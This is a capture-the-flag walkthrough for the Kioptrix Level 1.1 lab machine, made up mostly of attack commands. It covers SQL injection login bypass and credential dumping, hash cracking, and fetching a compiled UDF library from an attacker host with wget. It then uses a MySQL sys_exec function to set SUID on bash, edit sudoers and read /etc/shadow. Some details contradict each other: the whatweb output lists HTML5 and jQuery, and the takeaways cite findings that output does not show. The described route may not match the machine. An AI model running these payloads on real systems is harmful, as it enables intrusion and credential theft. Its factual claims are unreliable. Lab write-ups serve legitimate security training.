# Kioptrix Level 1.1 (#2): OSCP Walkthrough

**Machine:** Kioptrix Level 1.1 (#2)  
**Download:** [VulnHub: Kioptrix Level 1.1](https://www.vulnhub.com/entry/kioptrix-level-11-2,23/)  
**Difficulty:** Beginner  
**OS:** CentOS 4.5 (Linux 2.4.x kernel)  
**Goal:** Obtain `root` access and retrieve the flag  

**Author:** Ankit Patidar (ANKIT48274)

---

## Table of Contents

1. [Reconnaissance & Scanning](#1-reconnaissance--scanning)
2. [Service Enumeration](#2-service-enumeration)
3. [Web Application Fingerprinting](#3-web-application-fingerprinting)
4. [Exploitation: SQL Injection](#4-exploitation--sql-injection)
5. [Privilege Escalation: MySQL UDF Exploit](#5-privilege-escalation--mysql-udf-exploit)
6. [Key Takeaways](#6-key-takeaways)
7. [Screenshots](#7-screenshots)

---

## 1. Reconnaissance & Scanning

### Network Discovery

```bash
# Identify target on the local network
sudo netdiscover -r 192.168.1.0/24

# OR
sudo arp-scan --localnet
```

### Initial Nmap Scan

```bash
# Full service scan
nmap -sS -sV -sC -p- --min-rate=1000 -T4 -oN nmap_initial.txt <TARGET_IP>
```

### Nmap Results

```
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 3.9p1 (protocol 1.99)
80/tcp   open  http        Apache httpd 2.0.52 (CentOS)
3306/tcp open  mysql       MySQL (unauthorized)
MAC Address: 00:0C:29:XX:XX:XX (VMware)
```

**Open Ports:**
| Port | Service | Version | Note |
|------|---------|---------|------|
| 22 | SSH | OpenSSH 3.9p1 | Protocol 1.99 |
| 80 | HTTP | Apache 2.0.52 (CentOS) | **Main attack vector** |
| 3306 | MySQL | MySQL | No auth attempt yet |

**Observation:** No HTTPS (443) on this machine: the web attack surface shifts from mod_ssl to the web application itself.

---

## 2. Service Enumeration

### HTTP Service: Port 80

```bash
# Check HTTP headers
curl -I http://<TARGET_IP>

# Browse the main page
curl http://<TARGET_IP>

# WhatWeb for CMS/technology identification
whatweb http://<TARGET_IP>
```

**whatweb output:**
```
http://<TARGET_IP> [200 OK] Apache[2.0.52], Country[RESERVED][ZZ], Email[someuser@someuser.net], HTML5, HTTPServer[CentOS], IP[<TARGET_IP>], JQuery, MetaGenerator[Allaire Kawa], PasswordField[password], Script, Title[Kioptrix Level 1.1 #2]
```

### Web Application Analysis

The main page presents a **login portal** with username and password fields. This is a custom PHP application.

```bash
# Check for robots.txt
curl http://<TARGET_IP>/robots.txt

# Directory brute-forcing
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt -x php,html,txt

# OR using dirb
dirb http://<TARGET_IP> /usr/share/wordlists/dirb/common.txt
```

---

## 3. Web Application Fingerprinting

### Login Bypass Testing

Test for common SQL injection payloads in the login form:

```bash
# Test with curl - simple SQLi bypass
curl -X POST http://<TARGET_IP>/index.php \
  -d "uname=admin' OR '1'='1&psw=admin' OR '1'='1"

# Or manually via browser/Burp Suite
```

### Parameter Fuzzing

```bash
# Check for SQL error disclosure
curl -X POST http://<TARGET_IP>/index.php \
  -d "uname=admin'&psw=test"

curl -X POST http://<TARGET_IP>/index.php \
  -d "uname=test&psw=admin'"
```

---

## 4. Exploitation: SQL Injection

### Step 1: Identify SQLi Vulnerability

Submit the following credentials in the login form:

- **Username:** `admin' OR 1=1-- -`
- **Password:** `anything`

> **Note:** The `-- -` comments out the rest of the SQL query, bypassing authentication.

Alternatively, check if it's a union-based SQL injection:

- **Username:** `admin' UNION SELECT 1,2,3-- -`
- **Password:** `anything`

### Step 2: Manual SQL Injection Exploitation

#### Enumerate Column Count

```bash
# Determine number of columns
# Try different column counts
curl -X POST http://<TARGET_IP>/index.php \
  -d "uname=admin' ORDER BY 1-- -&psw=test"
  
curl -X POST http://<TARGET_IP>/index.php \
  -d "uname=admin' ORDER BY 2-- -&psw=test"
  
curl -X POST http://<TARGET_IP>/index.php \
  -d "uname=admin' ORDER BY 3-- -&psw=test"
```

#### Extract Database Information

```bash
# Extract MySQL version
curl -X POST http://<TARGET_IP>/index.php \
  -d "uname=admin' UNION SELECT 1,@@version,3-- -&psw=test"

# Extract current database user
curl -X POST http://<TARGET_IP>/index.php \
  -d "uname=admin' UNION SELECT 1,user(),3-- -&psw=test"

# Extract database name
curl -X POST http://<TARGET_IP>/index.php \
  -d "uname=admin' UNION SELECT 1,database(),3-- -&psw=test"
```

### Step 3: Extract Table and Column Data

```bash
# List all databases
curl -X POST http://<TARGET_IP>/index.php \
  -d "uname=admin' UNION SELECT 1,schema_name,3 FROM information_schema.schemata-- -&psw=test"

# List tables in current database
curl -X POST http://<TARGET_IP>/index.php \
  -d "uname=admin' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()-- -&psw=test"

# Dump credentials from the users table
curl -X POST http://<TARGET_IP>/index.php \
  -d "uname=admin' UNION SELECT 1,CONCAT(username,':',password),3 FROM users-- -&psw=test"
```

### Step 4: Crack the Password Hash

```bash
# Example extracted hash:
# admin:5d41402abc4b2a76b9719d911017c592

# Identify hash type
hashid '5d41402abc4b2a76b9719d911017c592'

# Crack with John
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# OR with hashcat
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```

### Step 5: Verify Credentials via SSH

```bash
ssh <USERNAME>@<TARGET_IP>
```

Now you have an authenticated shell on the target!

---

## 5. Privilege Escalation

### Step 1: Initial Enumeration

```bash
# Current user
whoami
id

# System info
uname -a
cat /etc/redhat-release

# MySQL access check
mysql -u root -p
# Try blank password or captured credentials
```

### Step 2: Identify MySQL UDF Exploitation Path

The key observation: The web application uses MySQL, and we likely have MySQL credentials or access. If MySQL runs as `root` (common), we can use **MySQL User-Defined Functions (UDF)** to execute system commands.

```bash
# Check MySQL version
mysql -u root -p -e "SELECT @@version;"

# Check if MySQL runs as root
mysql -u root -p -e "SELECT user(), current_user();"

# Check if we can create files
mysql -u root -p -e "SHOW VARIABLES LIKE '%secure%';"
```

### Step 3: Exploit MySQL UDF for Command Execution

The MySQL UDF exploit leverages the ability to create a shared library that provides a `sys_exec()` or `do_system()` function, allowing command execution as the MySQL user (often `root` on older systems).

**Method A: Using the MySQL UDF exploit from exploit-db**

```bash
# On Kali, locate the exploit
searchsploit mysql udf

# The commonly used exploit for this machine
searchsploit -m 1518.c
```

**Method B: Compile and transfer the UDF library**

```bash
# On Kali - compile the UDF shared library
gcc -g -c 1518.c
gcc -g -shared -o udf.so 1518.o -lc

# Transfer to target
python3 -m http.server 8000

# On target (via SSH session)
cd /tmp
wget http://<KALI_IP>:8000/udf.so
```

### Step 4: Load the UDF in MySQL

```bash
# Connect to MySQL on the target
mysql -u root -p

# Within MySQL, create the UDF function
USE mysql;
CREATE TABLE foo (line blob);
INSERT INTO foo VALUES (LOAD_FILE('/tmp/udf.so'));
SELECT * FROM foo INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'udf.so';
```

**Alternative: for older MySQL (MySQL < 5.0.67):**

```bash
# The plugin directory might not exist; use:
SELECT * FROM foo INTO DUMPFILE '/usr/lib/udf.so';
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'udf.so';
```

### Step 5: Execute Commands as Root via MySQL UDF

```bash
# Test the function
mysql -u root -p -e "SELECT sys_exec('id');"

# Create a reverse shell or SUID binary
mysql -u root -p -e "SELECT sys_exec('chmod u+s /bin/bash');"

# Exit MySQL, then use the SUID bash
/bin/bash -p
whoami
# root
```

**Alternative command execution:**

```bash
# Add yourself to sudoers
mysql -u root -p -e "SELECT sys_exec('echo \"<USER> ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers');"

# Then sudo to root
sudo su -
```

### Step 6: Confirm Root Access

```bash
whoami
id
cat /etc/shadow | head -5
ls /root/
```

---

## 6. Key Takeaways

1. **SQL injection remains a top attack vector**: Even in 2026, SQLi vulnerabilities are common in custom web apps. Always test login forms with classic bypass payloads.
2. **MySQL UDF for Privesc**: When MySQL runs as `root` (common in older setups), UDF functions provide a reliable path to system command execution.
3. **SSH access is a bonus**: Getting SSH credentials via SQLi gives a more stable shell than a reverse shell, making post-exploitation easier.
4. **Web app reconnaissance is critical**: `whatweb` revealed the technology stack (PHP, MySQL, CentOS) confirming the exploitation path.
5. **Old MySQL versions**: Older MySQL (< 5.1) doesn't have `plugin` directories, requiring UDF files to be placed in `/usr/lib/` or similar paths.
6. **CentOS 4.5**: Same kernel as Kioptrix Level 1, so the kernel exploit still applies if the UDF path fails.

---

## 7. Screenshots

| Step | Screenshot |
|------|-----------|
| Nmap scan results | *[Image: Nmap Scan]* |
| Login page discovery | *[Image: Login Page]* |
| SQL injection bypass | *[Image: SQLi Bypass]* |
| Database enumeration | *[Image: DB Enum]* |
| Hash extraction via SQLi | *[Image: Hash Extraction]* |
| MySQL UDF compilation | *[Image: MySQL UDF]* |
| UDF function creation | *[Image: UDF Create]* |
| Root shell obtained | *[Image: Root Shell]* |

---

## Quick Reference: Commands

| Phase | Command |
|-------|---------|
| Discovery | `sudo netdiscover -r 192.168.1.0/24` |
| Nmap Scan | `nmap -sS -sV -sC -p- -T4 -oN scan.txt <TARGET_IP>` |
| Web Tech | `whatweb http://<TARGET_IP>` |
| SQLi Auth Bypass | `admin' OR 1=1-- -` |
| Union SQLi | `admin' UNION SELECT 1,@@version,3-- -` |
| Dump Users | `admin' UNION SELECT 1,CONCAT(username,':',password),3 FROM users-- -` |
| Hash Crack | `john --format=raw-md5 --wordlist=rockyou.txt hash.txt` |
| MySQL UDF Search | `searchsploit mysql udf` |
| Compile UDF | `gcc -g -shared -o udf.so 1518.o -lc` |
| MySQL UDF Load | `CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'udf.so';` |
| Execute Command | `SELECT sys_exec('cat /etc/shadow');` |
| SUID Privesc | `SELECT sys_exec('chmod u+s /bin/bash'); /bin/bash -p` |

---

*M4d3 w1th ❤️ by Ankit Patidar*
